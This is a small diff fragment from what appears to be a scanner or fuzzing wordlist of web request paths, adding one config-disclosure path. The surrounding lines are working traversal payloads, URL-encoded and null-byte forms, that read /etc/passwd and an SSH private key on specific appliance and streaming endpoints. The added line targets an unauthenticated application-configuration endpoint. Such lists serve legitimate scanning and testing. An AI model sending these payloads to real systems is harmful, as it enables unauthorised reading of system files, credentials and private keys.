@@ -3,3 +3,4 @@
 /dataservice/disasterrecovery/download/token/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Fetc%2Fpasswd
 /dataservice/disasterrecovery/download/token/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Fetc%2Fviptela%2F.ssh%2Fid_dsa
 /demo/file/../../../../../../../../etc/passwd%00filename.mp4/chunk.m3u8?nimblesessionid=1484448
+/api/index.php/v1/config/application?public=true
